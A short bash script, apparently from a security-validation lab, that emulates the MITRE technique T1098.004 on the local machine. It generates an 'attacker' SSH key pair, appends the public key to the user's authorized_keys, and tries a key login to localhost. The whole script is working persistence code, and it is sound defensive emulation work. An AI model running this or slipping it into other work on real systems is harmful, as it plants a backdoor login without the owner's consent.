#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1098.004：SSH authorized_keys 持久化——追加攻击者公钥并尝试密钥登入
ssh-keygen -q -t ed25519 -N '' -f atk_ed25519 -C secval-atk 2>/dev/null
mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
cat atk_ed25519.pub >> "$HOME/.ssh/authorized_keys"; chmod 600 "$HOME/.ssh/authorized_keys"
echo "$HOME/.ssh/authorized_keys" > system_paths.txt
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i atk_ed25519 "${USER}@127.0.0.1" true 2> ssh-attempt.txt || true
